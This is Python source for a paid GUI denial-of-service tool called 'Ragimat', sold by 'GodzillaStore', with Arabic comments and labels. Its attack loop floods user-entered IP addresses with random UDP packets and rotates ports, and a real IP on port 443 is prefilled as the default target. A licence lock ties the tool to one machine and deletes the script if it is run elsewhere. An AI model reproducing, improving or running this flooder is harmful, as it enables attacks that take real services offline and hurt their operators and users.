import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import socket
import random
import time
import threading
import sys
import os
from datetime import datetime
import uuid
import hashlib
import json
import base64
import webbrowser
import getpass

class DeviceLockManager:
    def __init__(self):
        self.lock_file = os.path.join(os.path.expanduser("~"), ".ddos_device_lock")
        self.hardware_id = self.generate_hardware_id()
        self.allowed = False
        
    def generate_hardware_id(self):
        """إنشاء معرف فريد للجهاز"""
        user = getpass.getuser()
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                       for elements in range(0, 2*6, 2)][::-1])
        return hashlib.sha256(f"{user}@{mac}".encode()).hexdigest()
    
    def check_device(self):
        """التحقق من أن الأداة تعمل على الجهاز المسجل"""
        if not os.path.exists(self.lock_file):
            # إذا لم يكن هناك ملف قفل، ننشئ واحدًا جديدًا لهذا الجهاز
            with open(self.lock_file, "w") as f:
                json.dump({
                    "hardware_id": self.hardware_id,
                    "first_run": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }, f)
            self.allowed = True
            return True
            
        try:
            with open(self.lock_file, "r") as f:
                data = json.load(f)
                saved_hwid = data.get("hardware_id")
                
                if saved_hwid == self.hardware_id:
                    self.allowed = True
                    return True
                else:
                    # إذا كان المعرف مختلفًا، فهذا جهاز آخر
                    return False
        except:
            # في حالة وجود خطأ في قراءة الملف، نعتبره جهازًا غير مسموح
            return False
    
    def show_purchase_message(self):
        """عرض رسالة شراء الأداة للمستخدم"""
        msg = """
        هذه الأداة غير مسجلة على هذا الجهاز
        
        لاستخدام هذه الأداة، يرجى شراء ترخيص من المطور الرسمي.
        
        معلومات المطور :
        - التواصل: @godzillastore (Telegram)
        
        سيتم حذف هذه الأداة إذا حاولت تشغيلها مرة أخرى على هذا الجهاز
        """
        
        root = tk.Tk()
        root.withdraw()
        messagebox.showerror("الأداة غير مسجلة", msg.strip())
        
        # عرض نافذة إضافية مع تفاصيل المطور
        dev_window = tk.Toplevel()
        dev_window.title("معلومات المطور")
        dev_window.geometry("500x400")
        
        # إطار العنوان
        header_frame = tk.Frame(dev_window, bg="#3498db", height=70)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = tk.Label(header_frame, text="معلومات المطور", 
                             font=("Cairo", 18, "bold"), bg="#3498db", fg="white")
        title_label.pack(pady=15)
        
        # معلومات المطور
        info_frame = tk.Frame(dev_window, bg="#ecf0f1")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        dev_info = """
        GodzillaStore - أدوات احترافية
        
        للتواصل مع المطور :

        - التليجرام: @godzillastore

        سياسة الاستخدام :
        
        1. هذه الأداة مسجلة لجهاز واحد فقط
        2. أي محاولة لنشر الأداة ستؤدي إلى تعطيلها
        3. للاستخدام على أجهزة متعددة، يلزم شراء تراخيص إضافية
        
        للشراء أو الاستفسار، يرجى التواصل مع المطور
        """
        
        info_text = scrolledtext.ScrolledText(info_frame, font=("Cairo", 12), 
                                            bg="#6D42428B", fg="#2c3e50", padx=10, pady=10)
        info_text.insert(tk.END, dev_info.strip())
        info_text.configure(state=tk.DISABLED)
        info_text.pack(fill=tk.BOTH, expand=True)
        
        # أزرار
        button_frame = tk.Frame(dev_window, bg="#ecf0f1")
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        buy_button = tk.Button(button_frame, text="شراء الأداة", font=("Cairo", 12),
                             bg="#2980b9", fg="white", width=15, 
                             command=lambda: webbrowser.open("wa.me//249923544456"))
        buy_button.pack(side=tk.LEFT, padx=10)
        
        contact_button = tk.Button(button_frame, text="التواصل مع الدعم", font=("Cairo", 12),
                                 bg="#27ae60", fg="white", width=15,
                                 command=lambda: webbrowser.open("wa.me//249923544456"))
        contact_button.pack(side=tk.LEFT, padx=10)
        
        quit_button = tk.Button(button_frame, text="خروج", font=("Cairo", 12),
                              bg="#e74c3c", fg="white", width=10, 
                              command=lambda: sys.exit(0))
        quit_button.pack(side=tk.RIGHT, padx=10)
        
        dev_window.mainloop()
        
        # بعد إغلاق النافذة، ننهي البرنامج ونحذف الأداة
        try:
            os.remove(sys.argv[0])  # حذف ملف الأداة
            os.remove(self.lock_file)  # حذف ملف القفل
        except:
            pass
        
        sys.exit(0)

class DDoSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ragimat V2.1.0.1  [ GodzillaStore ]")
                # تغيير الأيقونة (الطريقة 1 باستخدام ملف .ico)
        try:
            self.root.iconbitmap("D:\Testing\Tools\DDos-Attack\Advanced Edition\الراجمات\icon.ico")  # أو المسار الكامل للايقونة
        except:
            pass  # تجاهل الخطأ إذا لم يتم العثور على الملف

        self.root.geometry("400x700")
        self.root.resizable(True, True)
        self.root.configure(bg="#2c3e50")
        
        # إدارة قفل الجهاز
        self.device_manager = DeviceLockManager()
        
        # التحقق من الجهاز
        if not self.device_manager.check_device():
            self.device_manager.show_purchase_message()
            return
        
        # إعداد المتغيرات
        self.attack_active = False
        self.targets = []  # قائمة الأهداف (كل هدف عبارة عن tuple: (ip, port))
        self.sent_packets = {}  # قاموس لتتبع عدد الحزم المرسلة لكل هدف
        self.start_time = None
        self.threads = []  # قائمة الخيوط
        
        # إنشاء واجهة المستخدم
        self.create_widgets()
        
        # إعداد السوكيت
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)
    
    def create_widgets(self):
        # إطار العنوان
        header_frame = tk.Frame(self.root, bg="#3498db", height=80)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        title_label = tk.Label(header_frame, text="وَمَا رَمَيْتَ إِذْ رَمَيْتَ وَلَٰكِنَّ اللَّهَ رَمَىٰ", 
                             font=("Cairo", 22, "bold"), bg="#3498db", fg="white")
        title_label.pack(pady=20)
        
        # معلومات الجهاز
        device_frame = tk.Frame(self.root, bg="#2c3e50")
        device_frame.pack(fill=tk.X, padx=20, pady=5)
        
        device_label = tk.Label(device_frame, 
                              text=f"Your ID : {self.device_manager.hardware_id[:12]}...",
                              font=("Cairo", 9), bg="#2c3e50", fg="#00e1ff")
        device_label.pack()
        
        # إطار الإدخال
        input_frame = tk.Frame(self.root, bg="#2c3e50")
        input_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # حقل إدخال IP
        ip_label = tk.Label(input_frame, text="IP Target ", font=("Cairo", 12), 
                          bg="#2c3e50", fg="white", anchor="w")
        ip_label.grid(row=0, column=0, padx=5, pady=5, sticky="w")
        
        self.ip_entry = tk.Entry(input_frame, font=("Cairo", 12), width=30)
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        self.ip_entry.insert(0, "104.18.36.14")  # عنوان افتراضي 
        
        # حقل إدخال المنفذ
        port_label = tk.Label(input_frame, text="Port ", font=("Cairo", 12), 
                           bg="#2c3e50", fg="white", anchor="w")
        port_label.grid(row=1, column=0, padx=5, pady=5, sticky="w")
        
        self.port_entry = tk.Entry(input_frame, font=("Cairo", 12), width=30)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5)
        self.port_entry.insert(0, "443")  # منفذ افتراضي
        
        # زر إضافة هدف
        add_target_button = tk.Button(input_frame, text="إضافة الهدف الحالي", font=("Cairo", 12),
                                   bg="#27ae60", fg="black", command=self.add_target)
        add_target_button.grid(row=2, column=0, columnspan=2, pady=10)
        
        # جدول الأهداف
        targets_frame = tk.Frame(self.root, bg="#2c3e50")
        targets_frame.pack(fill=tk.X, padx=20, pady=10)
        
        targets_label = tk.Label(targets_frame, text="Targets ", font=("Cairo", 12), 
                              bg="#2c3e50", fg="white", anchor="w")
        targets_label.pack(anchor="w", pady=5)
        
        self.targets_listbox = tk.Listbox(targets_frame, font=("Cairo", 10), 
                                       bg="#1c2833", fg="#2ecc71", height=5)
        self.targets_listbox.pack(fill=tk.BOTH, expand=True)
        
        # شريط التقدم
        progress_frame = tk.Frame(self.root, bg="#2c3e50")
        progress_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.progress = ttk.Progressbar(progress_frame, orient="horizontal", 
                                      length=500, mode="determinate")
        self.progress.pack(pady=10)
        
        self.progress_label = tk.Label(progress_frame, text="جاهز للبدء", 
                                    font=("Arial", 10), bg="#2c3e50", fg="white")
        self.progress_label.pack()
        
        # أزرار التحكم
        button_frame = tk.Frame(self.root, bg="#2c3e50")
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.start_button = tk.Button(button_frame, text="بدء الهجوم", font=("Cairo", 12),
                                   bg="#27ae60", fg="white", width=15, command=self.start_attack)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(button_frame, text="إيقاف الهجوم", font=("Cairo", 12),
                                  bg="#ff1900", fg="white", width=15, command=self.stop_attack,
                                  state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=10)
        
        # زر معلومات المطور
        dev_button = tk.Button(button_frame, text="معلومات المطور", font=("Cairo", 10),
                             bg="#2980b9", fg="white", width=15,
                             command=self.show_dev_info)
        dev_button.pack(side=tk.RIGHT, padx=5)
        
        # منطقة السجل
        log_frame = tk.Frame(self.root, bg="#2c3e50")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        log_label = tk.Label(log_frame, text="سجل الأحداث ", font=("Cairo", 12), 
                          bg="#2c3e50", fg="white", anchor="w")
        log_label.pack(anchor="w", pady=5)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, font=("Cairo", 10), 
                                               bg="#1c2833", fg="#2ecc71", height=8)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.configure(state=tk.DISABLED)
        
        # معلومات التذييل
        footer_frame = tk.Frame(self.root, bg="#2c3e50")
        footer_frame.pack(fill=tk.X, padx=20, pady=5)
        
        warning_label = tk.Label(footer_frame, 
                              text=".",
                              font=("Cairo", 9), bg="#2c3e50", fg="#e74c3c")
        warning_label.pack()
    
    def show_dev_info(self):
        """عرض معلومات المطور"""
        dev_window = tk.Toplevel()
        dev_window.title("معلومات المطور")
        dev_window.geometry("500x300")
        
        # إطار العنوان
        header_frame = tk.Frame(dev_window, bg="#3498db", height=60)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # عنوان النافذة
        title_label = tk.Label(header_frame, text="GodzillaStore", 
                             font=("Cairo", 18, "bold"), bg="#3498db", fg="white")
        title_label.pack(pady=10)
        
        # معلومات المطور
        info_frame = tk.Frame(dev_window, bg="#ecf0f1")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        dev_info = """
        للتواصل مع المطور :

        - التليجرام: @godzillastore
        - الموقع الرسمي: https://godzillastore.company.site
        
        هذه الأداة مسجلة لجهاز واحد فقط.
        أي محاولة لنشر الأداة ستؤدي إلى تعطيلها
        """
        
        info_text = tk.Text(info_frame, font=("Cairo", 12), 
                          bg="#ecf0f1", fg="#2c3e50", padx=10, pady=10)
        info_text.insert(tk.END, dev_info.strip())
        info_text.configure(state=tk.DISABLED)
        info_text.pack(fill=tk.BOTH, expand=True)
        
        # أزرار
        button_frame = tk.Frame(dev_window, bg="#ecf0f1")
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        contact_button = tk.Button(button_frame, text="التواصل مع الدعم", font=("Cairo", 12),
                                 bg="#27ae60", fg="white", width=15,
                                 command=lambda: webbrowser.open("wa.me//249923544456"))
        contact_button.pack(side=tk.LEFT, padx=10)
        
        close_button = tk.Button(button_frame, text="إغلاق", font=("Cairo", 12),
                               bg="#e74c3c", fg="white", width=10, 
                               command=dev_window.destroy)
        close_button.pack(side=tk.RIGHT, padx=10)
    
    def add_target(self):
        """إضافة هدف جديد إلى القائمة"""
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        
        if not ip or not port:
            messagebox.showerror("خطأ", "يرجى إدخال IP الهدف ورقم المنفذ")
            return
        
        try:
            port = int(port)
        except ValueError:
            messagebox.showerror("خطأ", "رقم المنفذ يجب أن يكون رقماً صحيحاً")
            return
        
        target = (ip, port)
        self.targets.append(target)
        self.targets_listbox.insert(tk.END, f"{ip}:{port}")
        self.log_message(f"تم إضافة هدف: {ip}:{port}")
    
    def log_message(self, message):
        """إضافة رسالة إلى سجل الأحداث"""
        now = datetime.now()
        timestamp = now.strftime("%H:%M:%S")
        formatted_message = f"[{timestamp}] {message}\n"
        
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.insert(tk.END, formatted_message)
        self.log_text.configure(state=tk.DISABLED)
        self.log_text.yview(tk.END)  # التمرير إلى آخر سطر
    
    def update_progress(self, value, message):
        """تحديث شريط التقدم والنص"""
        self.progress['value'] = value
        self.progress_label.config(text=message)
    
    def simulate_progress(self):
        """شريط التقدم قبل بدء الهجوم الفعلي"""
        self.log_message("جارٍ تحضير الهجوم...")
        self.update_progress(0, "جارٍ التحضير...")
        
        for i in range(0, 101, 5):
            if not self.attack_active:
                return
            self.update_progress(i, f"تحضير الهجوم... {i}%")
            time.sleep(0.1)
        
        self.update_progress(100, "الهجوم جاهز للبدء!")
        self.log_message("الهجوم جاري التنفيذ...")
    
    def start_attack(self):
        """بدء هجوم DDoS على جميع الأهداف"""
        if not self.targets:
            messagebox.showerror("خطأ", "يرجى إضافة هدف واحد على الأقل")
            return
        
        self.attack_active = True
        self.start_time = time.time()
        self.sent_packets = {target: 0 for target in self.targets}
        
        # تحديث واجهة المستخدم
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.configure(state=tk.DISABLED)
        
        # بدء محاكاة التقدم في خيط منفصل
        threading.Thread(target=self.simulate_progress, daemon=True).start()
        
        # بدء الهجوم الفعلي لكل هدف في خيط منفصل
        for target in self.targets:
            thread = threading.Thread(target=self.run_attack, args=(target[0], target[1], target), daemon=True)
            self.threads.append(thread)
            thread.start()
    
    def run_attack(self, ip, port, target):
        """تنفيذ هجوم DDoS على هدف محدد"""
        time.sleep(5)  # انتظار انتهاء محاكاة التقدم
        
        while self.attack_active:
            try:
                self.sock.sendto(self.bytes, (ip, port))
                self.sent_packets[target] += 1
                
                # تحديث السجل في واجهة المستخدم
                elapsed = time.time() - self.start_time
                packets_per_sec = self.sent_packets[target] / elapsed if elapsed > 0 else 0
                
                self.log_message(f"تم إرسال {self.sent_packets[target]} حزمة إلى {ip} عبر المنفذ {port}")
                self.log_message(f"معدل الإرسال لـ {ip}: {packets_per_sec:.2f} حزمة/الثانية")
                
                # زيادة المنفذ (تكتيك تغيير المنافذ)
                port += 1
                if port == 65534:
                    port = 1
                
                # إبطاء الهجوم قليلاً لتجنب تجميد الواجهة
                time.sleep(0.02)
                
            except Exception as e:
                self.log_message(f"خطأ في الهجوم على {ip}: {str(e)}")
                break
    
    def stop_attack(self):
        """إيقاف هجوم DDoS"""
        self.attack_active = False
        
        # تحديث واجهة المستخدم
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        elapsed = time.time() - self.start_time
        total_packets = sum(self.sent_packets.values())
        packets_per_sec = total_packets / elapsed if elapsed > 0 else 0
        
        self.log_message(f"تم إيقاف الهجوم")
        self.log_message(f"الإحصائيات النهائية:")
        for target, packets in self.sent_packets.items():
            self.log_message(f"- إجمالي الحزم المرسلة إلى {target[0]}: {packets}")
        self.log_message(f"- المدة الإجمالية: {elapsed:.2f} ثانية")
        self.log_message(f"- معدل الإرسال الإجمالي: {packets_per_sec:.2f} حزمة/الثانية")
        
        self.update_progress(0, "الهجوم متوقف")

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSGUI(root)
    root.mainloop()